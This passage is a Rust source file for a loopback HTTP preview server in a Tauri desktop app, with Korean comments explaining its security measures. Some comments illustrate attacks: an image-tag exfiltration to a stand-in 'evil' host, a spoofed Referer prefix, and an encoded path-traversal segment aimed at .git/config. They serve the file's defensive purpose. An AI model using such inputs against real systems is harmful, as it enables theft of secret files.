//! 로컬 HTML 프리뷰 — 파일트리에서 우클릭한 `.html`을 앱 내장 브라우저에서 연다.
//!
//! ## 왜 루프백 HTTP 서버인가
//! macOS의 WKWebView(내장 브라우저의 네이티브 자식 webview)는 `file://`을 `loadRequest:`로
//! 못 띄운다(`loadFileURL:allowingReadAccessToURL:`가 필요한데 wry가 노출하지 않음). 게다가
//! 네이티브 경로의 `navigation_gate`(browser.rs)는 `file:`을 명시적 위협으로 차단한다. 반면
//! **`127.0.0.1` URL은 프론트의 `classifyMode`가 iframe 경로로 라우팅**해(browser.ts) React
//! `<iframe>`으로 렌더된다 — localhost dev 서버 프리뷰와 완전히 같은, 이미 검증된 경로다.
//! 그래서 파일과 그 형제 리소스를 루프백 HTTP로 흘려주고 그 URL을 브라우저 탭으로 연다.
//!
//! ## 서빙 루트 = 프리뷰 파일의 상위 폴더 (폴더별 포트)
//! 서버 루트를 파일의 **상위 폴더**로 잡으면 `./style.css`(상대)도, `/assets/app.js`(루트절대)도
//! 모두 그 폴더 기준으로 해석된다 — `python -m http.server`를 그 폴더에서 띄운 것과 동일한
//! 직관. path-prefix(`/{id}/...`) 방식은 루트절대 서브리소스를 놓치므로 쓰지 않는다. 폴더마다
//! 서버 하나를 띄우고 포트를 캐시한다(같은 폴더 재프리뷰는 재사용).
//!
//! ## 보안
//! - `127.0.0.1`에만 바인드, `GET`/`HEAD`만, 최초 문서는 **폴더별** 토큰(`?t=`) 필수 —
//!   원격 페이지가 루프백으로 레포 파일을 읽는 것을 막고, 프리뷰된 페이지가 자기 토큰을
//!   유출해도 다른 폴더 서버에는 쓰지 못한다.
//! - 서브리소스(`./style.css` 등)는 쿼리에 토큰이 없다 — **Referer의 출처가 이 서버 자신**
//!   이면 통과시킨다. 쿼리 토큰을 Referer에서 찾는 방식은 못 쓴다: WebKit은 문서가
//!   **cross-site iframe** 안에 있으면 Referer를 origin만 남기고 깎는데, 앱이 정확히 그
//!   구조(부모 `tauri://localhost` → 프리뷰 `127.0.0.1`)라 CSS/JS가 전부 403이 됐다.
//! - 서빙 루트는 등록된 프로젝트 레포 안의 실제 폴더로만 확정된다(mint 시 정규화+컨테인먼트).
//! - 요청 경로는 서빙 루트에 join·정규화 후 루트 밖(`..`·심볼릭)이면 거부하고, `.`으로
//!   시작하는 세그먼트(`.git`/`.env`/`.ssh` 등)는 무조건 404 — 프리뷰된 악성 HTML이
//!   비밀 파일을 읽어 유출하는 것을 막는다(숨김 html 프리뷰는 포기하는 트레이드오프).
//! - 커넥션은 read/write 타임아웃 + 요청 크기 상한(64KB) + 동시 수 상한 — 인증 이전
//!   단계에서 로컬 프로세스가 스레드/메모리를 고갈시키지 못하게 한다.

use std::collections::HashMap;
use std::io::{BufRead, BufReader, Read, Seek, SeekFrom, Write};
use std::net::TcpStream;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use percent_encoding::{percent_decode_str, utf8_percent_encode, AsciiSet, CONTROLS};
use tauri::State;
use uuid::Uuid;

use crate::commands::projects::project_path;
use crate::commands::tree::resolve_in_repo;
use crate::error::{ErrorCode, IpcError};
use crate::state::AppState;

/// URL 경로 세그먼트에서 인코딩할 문자 — 비예약(unreserved) 밖은 전부. `/`?`#`&공백·한글 포함.
/// (RFC 3986 unreserved = ALPHA / DIGIT / `-` `.` `_` `~`)
const PATH_SEG: &AsciiSet = &CONTROLS
    .add(b' ')
    .add(b'"')
    .add(b'#')
    .add(b'%')
    .add(b'/')
    .add(b'<')
    .add(b'>')
    .add(b'?')
    .add(b'`')
    .add(b'{')
    .add(b'}')
    .add(b'\\')
    .add(b'^')
    .add(b'|');

/// 유휴 종료까지의 시간 — 프리뷰를 열어 두고 코드를 고치는 왕복을 견디는 최소치.
const IDLE_SECS: u64 = 600;
/// accept 폴링 주기 — 논블로킹 accept가 WouldBlock일 때 쉬는 시간(폐기·유휴 판정 주기이기도 하다).
const POLL: Duration = Duration::from_millis(250);

/// 한 폴더를 서빙하는 루프백 서버 한 대.
pub struct ServerEntry {
    port: u16,
    token: String,
    /// false로 내리면 accept 폴링 루프가 다음 tick에 스스로 종료한다(리스너 drop → 포트 해제).
    /// 폐기(revoke_under)와 유휴 종료가 공유하는 단일 신호다.
    alive: Arc<AtomicBool>,
    /// 마지막 활동 시각(서버 시작 기준 경과 초). 스레드가 유휴 판정에 쓰고, **mint도 재사용 시
    /// 갱신한다** — 유휴 직전(599초) 서버를 재사용해 URL을 내준 직후 폴링 tick이 그것을 죽이면
    /// 프론트는 살아있다고 믿는 포트가 닫혀 연결 거부가 되기 때문이다(재사용=활동으로 센다).
    last_hit: Arc<AtomicU64>,
    /// last_hit의 기준점 — mint가 "지금"을 같은 단위로 기록하려면 필요하다.
    started: Instant,
}

/// 프리뷰 루프백 서버 레지스트리 — base 폴더(정규화된 절대경로) → 서버.
#[derive(Default)]
pub struct PreviewServers {
    ports: HashMap<PathBuf, ServerEntry>,
}

impl PreviewServers {
    /// 주어진 경로 하위를 서빙하는 서버를 모두 폐기한다(프로젝트 제거 시). 폴링 루프가 다음
    /// tick에 종료하며, 레지스트리 엔트리는 여기서 즉시 빼 다음 mint가 새 서버를 띄우게 한다.
    /// 반환값은 폐기한 서버 수(로깅·테스트용).
    pub fn revoke_under(&mut self, root: &Path) -> usize {
        let doomed: Vec<PathBuf> = self
            .ports
            .keys()
            .filter(|base| base.starts_with(root))
            .cloned()
            .collect();
        for base in &doomed {
            if let Some(e) = self.ports.remove(base) {
                e.alive.store(false, Ordering::Relaxed);
            }
        }
        doomed.len()
    }

    /// 죽은 엔트리(alive=false)를 걷어낸다 — mint 때 1회 훑는다. 반환값은 제거한 수(테스트용).
    ///
    /// 유휴 종료·리스너 오류로 끝난 서버의 엔트리는 **아무도 지우지 않는다**: 폴링 스레드는
    /// 레지스트리 락을 잡지 않는 설계(잡으면 종료 경로가 mint와 교착할 수 있다)라 alive만
    /// 내리고 사라진다. 그래서 프리뷰한 폴더 수만큼 맵이 단조 증가한다 — 엔트리 하나는
    /// 작지만(경로+토큰+Arc 2개) 오래 켜 두는 앱에서 회수 안 되는 누적은 그 자체가 결함이다.
    /// mint는 사용자 우클릭 빈도로만 일어나므로 여기서 전체를 훑는 비용은 무시할 수 있다.
    fn prune_dead(&mut self) -> usize {
        let before = self.ports.len();
        self.ports.retain(|_, e| e.alive.load(Ordering::Relaxed));
        before - self.ports.len()
    }
}

/// 파일트리 우클릭 → `.html`을 내장 브라우저에서 열 URL을 만든다.
/// `(project_id, rel_path)`만 받아 서버측에서 절대경로를 확정한다(run_executable과 같은 계약).
#[tauri::command]
pub fn preview_local_url(
    state: State<'_, AppState>,
    project_id: String,
    rel_path: String,
) -> Result<String, IpcError> {
    let repo = project_path(&state, &project_id)?;
    // 상위까지는 resolve_in_repo가 정규화·컨테인먼트를 보장한다. 최종 대상도 정규화해
    // 마지막 컴포넌트가 심볼릭 링크로 레포 밖을 가리키는 경우까지 막는다(읽기판 방어).
    let target = resolve_in_repo(&repo, &rel_path)?;
    let target = dunce::canonicalize(&target)
        .map_err(|_| IpcError::new(ErrorCode::NotFound, "파일을 찾을 수 없습니다"))?;
    let repo_canon = dunce::canonicalize(&repo)
        .map_err(|e| IpcError::new(ErrorCode::Io, format!("레포 경로 확인 실패: {e}")))?;
    if !target.starts_with(&repo_canon) {
        return Err(IpcError::new(ErrorCode::Io, "레포 밖 경로입니다"));
    }
    if !target.is_file() {
        return Err(IpcError::new(ErrorCode::NotFound, "파일을 찾을 수 없습니다"));
    }

    // 서빙 루트 = 파일의 상위 폴더(이미 정규화됨). 파일은 그 루트의 최상위에 위치한다.
    let base = target
        .parent()
        .ok_or_else(|| IpcError::new(ErrorCode::Io, "상위 폴더를 찾을 수 없습니다"))?
        .to_path_buf();
    let file_name = target
        .file_name()
        .and_then(|s| s.to_str())
        .ok_or_else(|| IpcError::new(ErrorCode::Io, "파일 이름을 읽을 수 없습니다"))?
        .to_string();

    let mut reg = state.preview.lock().unwrap_or_else(|e| e.into_inner());
    // 죽은 엔트리를 먼저 회수한다 — 유휴 종료·리스너 오류로 끝난 서버가 남긴 스테일 엔트리는
    // 폴더를 옮겨 다닐수록 쌓이기만 한다(§prune_dead).
    reg.prune_dead();
    // 살아있는 서버만 재사용한다 — 유휴 종료된 서버가 남긴 스테일 엔트리는 없는 것으로 보고
    // 새로 띄운다(자기 치유). 덕분에 종료된 스레드가 레지스트리를 직접 건드릴 필요가 없다.
    // prune 뒤에도 이 필터는 남긴다 — 폴링 스레드가 prune과 get 사이에 alive를 내릴 수 있다.
    let reusable = reg
        .ports
        .get(&base)
        .filter(|e| e.alive.load(Ordering::Relaxed))
        .map(|e| {
            // 재사용도 활동이다 — 갱신하지 않으면 유휴 임계에 걸친 서버를 내주고 곧바로
            // 스레드가 죽여 연결 거부가 된다.
            e.last_hit
                .store(e.started.elapsed().as_secs(), Ordering::Relaxed);
            (e.port, e.token.clone())
        });
    let (port, token) = match reusable {
        Some(v) => v,
        None => {
            let token = Uuid::new_v4().simple().to_string();
            let entry = start_server(base.clone(), token.clone())?;
            let v = (entry.port, entry.token.clone());
            reg.ports.insert(base.clone(), entry); // 스테일 엔트리가 있으면 덮어쓴다
            v
        }
    };
    drop(reg);

    let enc = utf8_percent_encode(&file_name, PATH_SEG).to_string();
    Ok(format!("http://127.0.0.1:{port}/{enc}?t={token}"))
}

/// base 폴더를 루트로 하는 루프백 서버를 띄운다.
///
/// accept 루프는 **논블로킹 + 폴링**이다. 블로킹 `accept()`는 깨울 방법이 없어 서버가 프로세스
/// 종료까지 살아남았는데(프로젝트를 제거해도 계속 서빙), 폴링으로 바꾸면 같은 루프에서 폐기
/// (`alive=false`)와 유휴 종료를 함께 처리할 수 있다. 유휴 시 비용은 초당 4회 WouldBlock뿐이다.
fn start_server(base: PathBuf, token: String) -> Result<ServerEntry, IpcError> {
    let listener = std::net::TcpListener::bind(("127.0.0.1", 0))
        .map_err(|e| IpcError::new(ErrorCode::Io, format!("프리뷰 서버 시작 실패: {e}")))?;
    let port = listener
        .local_addr()
        .map_err(|e| IpcError::new(ErrorCode::Io, format!("포트 확인 실패: {e}")))?
        .port();
    listener
        .set_nonblocking(true)
        .map_err(|e| IpcError::new(ErrorCode::Io, format!("논블로킹 설정 실패: {e}")))?;

    let alive = Arc::new(AtomicBool::new(true));
    let last_hit = Arc::new(AtomicU64::new(0));
    let (t_alive, t_hit) = (alive.clone(), last_hit.clone());
    let t_token = token.clone(); // 스레드로 move할 사본 — 원본은 ServerEntry가 보관한다
    // 기준점을 스레드 밖에서 잡아 ServerEntry와 공유한다 — mint가 재사용 시 같은 단위로
    // last_hit을 갱신할 수 있어야 한다.
    let started = Instant::now();

    std::thread::Builder::new()
        .name("html-preview".into())
        .spawn(move || {
            loop {
                if !t_alive.load(Ordering::Relaxed) {
                    return; // 폐기됨(프로젝트 제거) — 리스너가 drop되며 포트가 해제된다
                }
                match listener.accept() {
                    Ok((stream, _)) => {
                        // ⚠️ accept된 스트림은 플랫폼에 따라 논블로킹을 상속한다. handle_conn은
                        // 타임아웃 있는 블로킹 I/O를 전제하므로 반드시 되돌린다 — 안 하면
                        // 요청 파싱이 WouldBlock으로 즉시 실패한다.
                        if stream.set_nonblocking(false).is_err() {
                            continue;
                        }
                        t_hit.store(started.elapsed().as_secs(), Ordering::Relaxed);
                        let base = base.clone();
                        let token = t_token.clone();
                        let hit = t_hit.clone();
                        let al = t_alive.clone();
                        // 커넥션마다 워커 스레드 — 느린 요청이 다른 서브리소스 요청을 막지 않게.
                        let _ = std::thread::Builder::new()
                            .name("html-preview-conn".into())
                            .spawn(move || {
                                let _ = handle_conn(stream, &base, &token, port, &al, &hit, started);
                            });
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        // 대기 중인 커넥션 없음 — 쉬면서 폐기·유휴를 판정한다.
                        // (sleep 없이 continue하면 CPU를 태우는 바쁜 루프가 된다.)
                        std::thread::sleep(POLL);
                        let idle = started
                            .elapsed()
                            .as_secs()
                            .saturating_sub(t_hit.load(Ordering::Relaxed));
                        if idle > IDLE_SECS {
                            // 탭을 닫았든 사용자가 떠났든 요청이 끊긴 것은 같다 — 한 조건으로 덮는다.
                            // 레지스트리 엔트리는 남지만 alive=false라 다음 mint가 새로 띄운다.
                            t_alive.store(false, Ordering::Relaxed);
                            return;
                        }
                    }
                    Err(e) => {
                        // 리스너가 못 쓰게 됨(fd 고갈·커널 오류 등) — 스레드를 접는다.
                        // ⚠️ 반드시 alive를 내리고 나가야 한다. 안 내리면 레지스트리 엔트리는
                        // "살아있음"으로 남아 **다음 mint가 죽은 포트를 그대로 재사용**해 URL을
                        // 내주고, 브라우저는 연결 거부(빈 탭)를 본다 — 프리뷰가 영구히 고장난
                        // 것처럼 보이는데 재시작 말고는 복구 수단이 없다. 유휴 종료 경로는 이미
                        // 같은 이유로 alive를 내리고 있었고 이 경로만 빠져 있었다.
                        log::warn!("[preview] accept 실패 — 서버를 종료합니다: {e}");
                        t_alive.store(false, Ordering::Relaxed);
                        return;
                    }
                }
            }
        })
        .map_err(|e| IpcError::new(ErrorCode::Io, format!("프리뷰 스레드 생성 실패: {e}")))?;

    Ok(ServerEntry { port, token, alive, last_hit, started })
}

/// 동시 커넥션 상한 — 인증 이전 단계에서 스레드 고갈을 막는 안전판(프리뷰 페이지 하나의
/// 정상 서브리소스 로딩은 브라우저가 host당 6개 안팎으로 제한하므로 여유가 크다).
const MAX_CONNS: usize = 64;
static CONNS: AtomicUsize = AtomicUsize::new(0);
struct ConnGuard;
impl Drop for ConnGuard {
    fn drop(&mut self) {
        CONNS.fetch_sub(1, Ordering::Relaxed);
    }
}

/// 쿼리 문자열(`a=1&t=..`)에 t=token이 있는가.
fn has_token(query: &str, token: &str) -> bool {
    query.split('&').any(|kv| {
        kv.split_once('=')
            .map(|(k, v)| k == "t" && v == token)
            .unwrap_or(false)
    })
}

/// `Range: bytes=start-end` / `bytes=start-` 단일 범위 파싱 → (start, inclusive end).
/// 그 외 형태(suffix `-N`, 다중 범위)는 None — 호출부가 200 전체 응답으로 폴백한다(스펙 허용).
fn parse_range(value: &str, len: u64) -> Option<(u64, u64)> {
    let spec = value.trim().strip_prefix("bytes=")?;
    let (s, e) = spec.split_once('-')?;
    let start: u64 = s.trim().parse().ok()?;
    let end: u64 = match e.trim() {
        "" => len.saturating_sub(1),
        v => v.parse::<u64>().ok()?.min(len.saturating_sub(1)),
    };
    if start > end {
        return None;
    }
    Some((start, end))
}

/// 요청 경로(`/sub/dir/app.js` 등) → base 안의 실제 파일 경로. 탈출·비밀파일이면 None.
/// handle_conn에서 분리해 유닛테스트로 우회 경로를 봉쇄한다.
///
/// 각 `/`-분리 세그먼트를 퍼센트 디코드한 뒤, **디코드 결과가 단일 평문 컴포넌트가 아니면
/// 거부**한다 — `%2F`/`%5C`(경로 구분자), 절대경로, `..`, `.`을 한 번에 막는다. 이 검사가
/// 없으면 `src%2F..%2F.git%2Fconfig` 한 세그먼트가 디코드 시 `src/../.git/config`로 풀려
/// PathBuf::push가 여러 컴포넌트로 붙여 dotfile 차단을 우회한다. `.`으로 시작하는 세그먼트도
/// 거부해 `.git`/`.env` 등 비밀 파일 유출을 막는다(모듈 doc § 보안).
fn resolve_request_path(base: &Path, path_part: &str) -> Option<PathBuf> {
    let rel = path_part.trim_start_matches('/');
    let mut joined = base.to_path_buf();
    for seg in rel.split('/') {
        if seg.is_empty() || seg == "." {
            continue;
        }
        let decoded = percent_decode_str(seg).decode_utf8_lossy();
        // 구분자·절대·상위·dotfile 세그먼트를 전부 거부 — 단일 Normal 컴포넌트만 허용.
        if decoded.contains('/') || decoded.contains('\\') || decoded.starts_with('.') {
            return None;
        }
        let mut comps = Path::new(decoded.as_ref()).components();
        match (comps.next(), comps.next()) {
            (Some(std::path::Component::Normal(c)), None) => joined.push(c),
            _ => return None,
        }
    }
    // 정규화 후 base 안에 있는지 확인 — 심볼릭 이탈까지 차단. 없는 파일이면 정규화 실패 → None.
    let resolved = dunce::canonicalize(&joined).ok()?;
    if !resolved.starts_with(base) || !resolved.is_file() {
        return None;
    }
    Some(resolved)
}

/// 한 커넥션 처리 — 요청 라인/헤더를 읽고 base 안의 파일 하나를 응답한다. keep-alive 없음,
/// Range는 단일 범위만(WKWebView 미디어 재생에 필요).
fn handle_conn(
    stream: TcpStream,
    base: &Path,
    token: &str,
    port: u16,
    alive: &AtomicBool,
    last_hit: &AtomicU64,
    started: Instant,
) -> std::io::Result<()> {
    CONNS.fetch_add(1, Ordering::Relaxed);
    let _guard = ConnGuard;
    let mut stream = stream;
    if CONNS.load(Ordering::Relaxed) > MAX_CONNS {
        return write_status(&mut stream, 503, "Service Unavailable");
    }
    // 폐기된 서버(프로젝트 제거)로 들어온 잔여 커넥션 — 파일을 주지 않는다.
    if !alive.load(Ordering::Relaxed) {
        return write_status(&mut stream, 503, "Service Unavailable");
    }
    // 유휴 판정 갱신 — 서브리소스 요청까지 활동으로 세어 프리뷰 중 서버가 죽지 않게.
    last_hit.store(started.elapsed().as_secs(), Ordering::Relaxed);
    // 느린/멈춘 클라이언트가 워커 스레드를 영구 점유하지 못하게 — 루프백에서 10s는 충분.
    let _ = stream.set_read_timeout(Some(Duration::from_secs(10)));
    let _ = stream.set_write_timeout(Some(Duration::from_secs(30)));
    // 요청 라인+헤더 총량 64KB 상한 — 무제한 read_line로 메모리가 자라지 못하게.
    let mut reader = BufReader::new(stream.try_clone()?).take(64 * 1024);

    // 요청 라인: "GET /path?query HTTP/1.1"
    let mut request_line = String::new();
    if reader.read_line(&mut request_line)? == 0 {
        return Ok(());
    }

    // 헤더를 빈 줄까지 소비(본문은 무시). Referer(서브리소스 토큰 상속)와 Range만 캡처.
    let mut referer = String::new();
    let mut range_hdr = String::new();
    for _ in 0..100 {
        let mut line = String::new();
        if reader.read_line(&mut line)? == 0 {
            break;
        }
        if line == "\r\n" || line == "\n" {
            break;
        }
        if let Some((name, value)) = line.split_once(':') {
            if name.eq_ignore_ascii_case("referer") {
                referer = value.trim().to_string();
            } else if name.eq_ignore_ascii_case("range") {
                range_hdr = value.trim().to_string();
            }
        }
    }

    let mut parts = request_line.split_whitespace();
    let method = parts.next().unwrap_or("");
    let raw_target = parts.next().unwrap_or("");
    let head_only = match method {
        "GET" => false,
        "HEAD" => true,
        _ => return write_status(&mut stream, 405, "Method Not Allowed"),
    };

    // target 분해: "/path?query"
    let (path_part, query) = match raw_target.split_once('?') {
        Some((p, q)) => (p, q),
        None => (raw_target, ""),
    };

    // 인증 — 둘 중 하나면 통과.
    //  (1) 쿼리 토큰: 앱이 URL로 직접 넘긴 최초 문서 로드.
    //  (2) Referer의 **출처(origin)** 가 이 서버 자신: 우리가 서빙한 문서가 낸 서브리소스
    //      (css/js/img), CSS의 @import, 페이지 간 링크까지 전부 여기에 해당한다.
    //
    // (2)가 쿼리 토큰이 아니라 origin 비교인 이유(실측): WebKit은 문서가 **cross-site
    // iframe** 안에 있으면 서브리소스의 Referer를 origin만 남기고 깎는다. 앱은 부모가
    // tauri://localhost(dev는 localhost:*)이고 프리뷰는 127.0.0.1이라 정확히 그 상황이라,
    // Referer 쿼리에서 토큰을 찾던 이전 방식은 CSS/JS가 전부 403이 되어 스타일 없는 페이지가
    // 됐다. (부모도 127.0.0.1이면 same-site라 전체 URL이 와서 증상이 안 보인다 — 재현 함정.)
    //
    // 위협 모델: 원격 페이지가 루프백을 긁는 경우는 Referer가 자기 출처라 차단된다. 같은
    // 기계의 다른 프로세스는 Referer를 위조할 수 있으나, 애초에 포트도 자유롭게 탐색할 수
    // 있는 위치라 실익이 없다. 최초 문서는 여전히 토큰이 필요하고, dotfile 차단·폴더 단위
    // 스코프·유휴 종료가 함께 노출 면적을 좁힌다.
    let query_ok = has_token(query, token);
    let self_origin = format!("http://127.0.0.1:{port}/");
    // 끝의 '/'까지 포함해 비교한다 — "…:8941.evil.com/" 같은 접두사 위장을 막는다.
    let referer_ok = referer.starts_with(&self_origin);
    if !query_ok && !referer_ok {
        return write_status(&mut stream, 403, "Forbidden");
    }

    // 요청 경로 → base 안의 실제 파일 (탈출·비밀파일 거부). 실패는 전부 404.
    let resolved = match resolve_request_path(base, path_part) {
        Some(p) => p,
        None => return write_status(&mut stream, 404, "Not Found"),
    };

    let mut file = match std::fs::File::open(&resolved) {
        Ok(f) => f,
        Err(_) => return write_status(&mut stream, 404, "Not Found"),
    };
    let len = file.metadata().map(|m| m.len()).unwrap_or(0);
    let ctype = content_type(&resolved);

    // Range(단일 범위)면 206 — WKWebView는 미디어(mp4 등)를 Range 없이는 재생하지 못한다.
    let range = if range_hdr.is_empty() { None } else { parse_range(&range_hdr, len) };
    if !range_hdr.is_empty() && range.is_none() && len > 0 {
        // bytes=start-end 파싱 실패 중 "시작이 파일 밖"인 명백한 케이스는 416으로 알린다.
        if let Some(spec) = range_hdr.trim().strip_prefix("bytes=") {
            if let Some((s, _)) = spec.split_once('-') {
                if s.trim().parse::<u64>().map(|v| v >= len).unwrap_or(false) {
                    let resp = format!(
                        "HTTP/1.1 416 Range Not Satisfiable\r\nContent-Range: bytes */{len}\r\n\
                         Content-Length: 0\r\nConnection: close\r\n\r\n"
                    );
                    return stream.write_all(resp.as_bytes());
                }
            }
        }
    }

    let (status, start, body_len, extra) = match range {
        Some((s, e)) if s < len => (
            "206 Partial Content",
            s,
            e - s + 1,
            format!("Content-Range: bytes {s}-{e}/{len}\r\n"),
        ),
        _ => ("200 OK", 0, len, String::new()),
    };

    let header = format!(
        "HTTP/1.1 {status}\r\nContent-Type: {ctype}\r\nContent-Length: {body_len}\r\n{extra}\
         {}Accept-Ranges: bytes\r\nCache-Control: no-store\r\nX-Content-Type-Options: nosniff\r\n\
         Connection: close\r\n\r\n",
        csp_header(&resolved)
    );
    stream.write_all(header.as_bytes())?;
    if head_only {
        return Ok(());
    }
    // 본문 스트리밍 — 큰 파일도 통째로 메모리에 올리지 않는다. Range면 구간만.
    if start > 0 {
        file.seek(SeekFrom::Start(start))?;
    }
    let mut remaining = body_len;
    let mut buf = [0u8; 64 * 1024];
    while remaining > 0 {
        let want = remaining.min(buf.len() as u64) as usize;
        let n = file.read(&mut buf[..want])?;
        if n == 0 {
            break;
        }
        stream.write_all(&buf[..n])?;
        remaining -= n as u64;
    }
    Ok(())
}

fn write_status(stream: &mut TcpStream, code: u16, reason: &str) -> std::io::Result<()> {
    let body = format!("{code} {reason}");
    let resp = format!(
        "HTTP/1.1 {code} {reason}\r\nContent-Type: text/plain; charset=utf-8\r\n\
         Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    stream.write_all(resp.as_bytes())
}

/// 문서(HTML/XHTML) 응답에 붙일 CSP 헤더 — 그 외 확장자는 빈 문자열(CSP는 문서가 소유한다).
///
/// 프리뷰된 HTML은 `allow-same-origin` iframe 안에서 자기 토큰을 가지므로, 서빙 루트의 형제
/// 파일을 읽어 원격으로 보낼 수 있다. `.git`/`.env` 차단(resolve_request_path)과 폴더별 토큰으로
/// 노출 범위는 이미 좁지만, **전송 채널** 자체를 여기서 막는다:
///   - `connect-src 'self'` : fetch/XHR/WebSocket/sendBeacon 원격 전송 차단 (주 유출 경로)
///   - `form-action 'none'` : 폼 POST 유출 차단
///   - `object-src 'none'` / `base-uri 'self'` : 플러그인·base 태그 우회 차단
///
/// `default-src`는 **의도적으로 지정하지 않는다** — 로컬 HTML 프리뷰는 CDN 스크립트·폰트·외부
/// 이미지를 흔히 쓰고(정상 사용의 대다수), 이를 막으면 기능 자체의 가치가 떨어진다. 그 대가로
/// `<img src="https://evil/?d=…">` 류의 유출은 남는다 — 완전 격리가 필요하면 `default-src 'self'`가
/// 필요하나 CDN 프리뷰를 깨므로 별도 옵트인 설정으로 다룬다(browser-preview-hardening-design §3.3).
///
/// `frame-ancestors`는 **넣으면 안 된다**: 프리뷰는 앱 origin(tauri://localhost)이 127.0.0.1을
/// iframe으로 감싸는 교차 출처 구조라 iframe 자체가 차단돼 기능이 죽는다.
fn csp_header(path: &Path) -> &'static str {
    match path
        .extension()
        .and_then(|e| e.to_str())
        .map(|e| e.to_ascii_lowercase())
        .as_deref()
    {
        Some("html" | "htm" | "xhtml") => {
            "Content-Security-Policy: connect-src 'self'; form-action 'none'; \
             object-src 'none'; base-uri 'self'\r\n"
        }
        _ => "",
    }
}

/// 확장자 → MIME. 서브리소스(css/js/img/font/wasm)까지 브라우저가 올바로 해석하도록.
fn content_type(path: &Path) -> &'static str {
    let ext = path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    match ext.as_str() {
        "html" | "htm" => "text/html; charset=utf-8",
        "xhtml" => "application/xhtml+xml; charset=utf-8",
        "css" => "text/css; charset=utf-8",
        "js" | "mjs" | "cjs" => "text/javascript; charset=utf-8",
        "json" | "map" => "application/json; charset=utf-8",
        "svg" => "image/svg+xml",
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "gif" => "image/gif",
        "webp" => "image/webp",
        "avif" => "image/avif",
        "ico" => "image/x-icon",
        "bmp" => "image/bmp",
        "wasm" => "application/wasm",
        "woff" => "font/woff",
        "woff2" => "font/woff2",
        "ttf" => "font/ttf",
        "otf" => "font/otf",
        "txt" | "md" => "text/plain; charset=utf-8",
        "xml" => "application/xml; charset=utf-8",
        // 미디어 — 뷰어의 <video>/<audio>가 이 서버에서 Range로 받아 재생한다.
        // MIME이 틀리면 nosniff 때문에 브라우저가 아예 디코드를 시도하지 않는다.
        "wav" => "audio/wav",
        "mp3" => "audio/mpeg",
        "m4a" => "audio/mp4",
        "aac" => "audio/aac",
        "flac" => "audio/flac",
        "oga" | "ogg" => "audio/ogg",
        "mp4" | "m4v" => "video/mp4",
        "mov" => "video/quicktime",
        "webm" => "video/webm",
        "ogv" => "video/ogg",
        _ => "application/octet-stream",
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn path_seg_encodes_reserved_and_unicode() {
        assert_eq!(utf8_percent_encode("a b#c?d", PATH_SEG).to_string(), "a%20b%23c%3Fd");
        assert_eq!(utf8_percent_encode("sub/dir", PATH_SEG).to_string(), "sub%2Fdir");
        // 한글은 UTF-8 바이트로 인코딩
        assert_eq!(utf8_percent_encode("가", PATH_SEG).to_string(), "%EA%B0%80");
        // 비예약은 그대로
        assert_eq!(utf8_percent_encode("app-1.2_x~y", PATH_SEG).to_string(), "app-1.2_x~y");
    }

    #[test]
    fn token_in_query() {
        assert!(has_token("t=abc", "abc"));
        assert!(has_token("x=1&t=abc&y=2", "abc"));
        assert!(!has_token("t=abcd", "abc"));
        assert!(!has_token("T=abc", "abc")); // 대소문자 구분 — 키는 소문자 t만
        assert!(!has_token("", "abc"));
        assert!(!has_token("t2=abc&u=t%3Dabc", "abc"));
    }

    #[test]
    fn range_single_forms() {
        assert_eq!(parse_range("bytes=0-99", 1000), Some((0, 99)));
        assert_eq!(parse_range("bytes=500-", 1000), Some((500, 999)));
        assert_eq!(parse_range("bytes=0-5000", 1000), Some((0, 999))); // end 클램프
        assert_eq!(parse_range("bytes=700-600", 1000), None); // 역전
        assert_eq!(parse_range("bytes=-500", 1000), None); // suffix 미지원 → 200 폴백
        assert_eq!(parse_range("bytes=0-1,5-9", 1000), None); // 다중 범위 미지원
        assert_eq!(parse_range("items=0-9", 1000), None);
    }

    #[test]
    fn content_type_by_ext() {
        assert_eq!(content_type(Path::new("/a/index.html")), "text/html; charset=utf-8");
        assert_eq!(
            content_type(Path::new("/a/page.xhtml")),
            "application/xhtml+xml; charset=utf-8"
        );
        assert_eq!(content_type(Path::new("/a/style.CSS")), "text/css; charset=utf-8");
        assert_eq!(content_type(Path::new("/a/app.mjs")), "text/javascript; charset=utf-8");
        assert_eq!(content_type(Path::new("/a/logo.svg")), "image/svg+xml");
        assert_eq!(content_type(Path::new("/a/data.bin")), "application/octet-stream");
    }

    /// 뷰어의 `<video>`/`<audio>`가 여기서 받아 재생한다. MIME이 틀리면 nosniff 때문에
    /// 브라우저가 디코드를 아예 시도하지 않으므로, 재생 대상 확장자는 전부 매핑되어야 한다
    /// (language-map.ts의 VIDEO_EXT·AUDIO_EXT와 짝이다 — 한쪽만 늘리면 조용히 깨진다).
    #[test]
    fn media_types_cover_playable_extensions() {
        for (name, want) in [
            ("clip.mp4", "video/mp4"),
            ("clip.m4v", "video/mp4"),
            ("clip.mov", "video/quicktime"),
            ("clip.webm", "video/webm"),
            ("clip.ogv", "video/ogg"),
            ("s.mp3", "audio/mpeg"),
            ("s.wav", "audio/wav"),
            ("s.m4a", "audio/mp4"),
            ("s.aac", "audio/aac"),
            ("s.flac", "audio/flac"),
            ("s.oga", "audio/ogg"),
            ("s.ogg", "audio/ogg"),
        ] {
            assert_eq!(
                content_type(Path::new(&format!("/a/{name}"))),
                want,
                "{name}의 MIME이 빠지면 재생이 조용히 실패한다"
            );
        }
    }

    /// 회귀 방지: 서브리소스 인증은 Referer의 **출처**로만 판정해야 한다.
    /// WebKit이 cross-site iframe에서 Referer를 origin만 남기고 깎기 때문에, 쿼리에서
    /// 토큰을 찾으려 하면 앱 안에서 CSS/JS가 전부 403이 된다(실제로 겪은 버그).
    #[test]
    fn referer_origin_auth_survives_stripped_referer() {
        let origin = format!("http://127.0.0.1:{}/", 8941u16);
        // WebKit이 cross-site iframe에서 실제로 보내는 형태 — 경로·쿼리 없음
        assert!("http://127.0.0.1:8941/".starts_with(&origin));
        // same-site라 전체 URL이 온 경우도 당연히 통과
        assert!("http://127.0.0.1:8941/index.html?t=abc".starts_with(&origin));
